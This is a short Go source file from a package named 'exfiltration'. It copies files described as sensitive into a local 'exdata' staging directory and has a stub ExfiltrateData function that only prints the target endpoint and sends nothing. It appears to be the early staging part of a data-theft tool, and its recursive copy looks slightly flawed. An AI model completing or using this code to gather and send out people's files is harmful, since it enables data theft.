package exfiltration

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
)

// CreateLocalArchives creates local copies of sensitive files in an "exdata" directory without compression
func CreateLocalArchives(files []string) error {
	// Create exdata directory if it doesn't exist
	exdataDir := "exdata"
	err := os.MkdirAll(exdataDir, 0755)
	if err != nil {
		return fmt.Errorf("failed to create exdata directory: %v", err)
	}

	// Copy each file or directory to the exdata directory
	for _, file := range files {
		err := copyPath(file, exdataDir)
		if err != nil {
			return err
		}
	}

	return nil
}

// copyPath copies a file or directory from source to destination
func copyPath(source, destDir string) error {
	// Check if the source is a directory
	sourceInfo, err := os.Stat(source)
	if err != nil {
		return fmt.Errorf("failed to get file info for %s: %v", source, err)
	}

	// If it's a directory, copy its contents
	if sourceInfo.IsDir() {
		return copyDirectory(source, destDir)
	}

	// Otherwise, it's a file, so copy the file
	return copyFile(source, destDir)
}

// copyFile copies a single file from source to destination
func copyFile(source, destDir string) error {
	// Open the source file
	srcFile, err := os.Open(source)
	if err != nil {
		return fmt.Errorf("failed to open source file %s: %v", source, err)
	}
	defer srcFile.Close()

	// Create the destination file
	destFilePath := filepath.Join(destDir, filepath.Base(source))
	destFile, err := os.Create(destFilePath)
	if err != nil {
		return fmt.Errorf("failed to create destination file %s: %v", destFilePath, err)
	}
	defer destFile.Close()

	// Copy the contents of the source file to the destination
	_, err = io.Copy(destFile, srcFile)
	if err != nil {
		return fmt.Errorf("failed to copy file %s to %s: %v", source, destFilePath, err)
	}

	return nil
}

// copyDirectory recursively copies a directory from source to destination
func copyDirectory(source, destDir string) error {
	// Get the list of files in the source directory
	files, err := os.ReadDir(source)
	if err != nil {
		return fmt.Errorf("failed to read directory %s: %v", source, err)
	}

	// Create the destination directory
	destDirPath := filepath.Join(destDir, filepath.Base(source))
	err = os.MkdirAll(destDirPath, 0755)
	if err != nil {
		return fmt.Errorf("failed to create destination directory %s: %v", destDirPath, err)
	}

	// Copy each file inside the source directory
	for _, file := range files {
		sourceFile := filepath.Join(source, file.Name())
		destFile := filepath.Join(destDirPath, file.Name())

		// Recursively copy files or subdirectories
		if file.IsDir() {
			err = copyDirectory(sourceFile, destFile)
		} else {
			err = copyFile(sourceFile, destDirPath)
		}

		if err != nil {
			return err
		}
	}

	return nil
}

// ExfiltrateData is a placeholder function to handle exfiltration
func ExfiltrateData(files []string, endpoint string) error {
	// Placeholder logic for exfiltration
	fmt.Println("Exfiltrating data to:", endpoint)

	// Implement actual logic here
	// Currently, it's just a mock to avoid undefined errors
	return nil
}
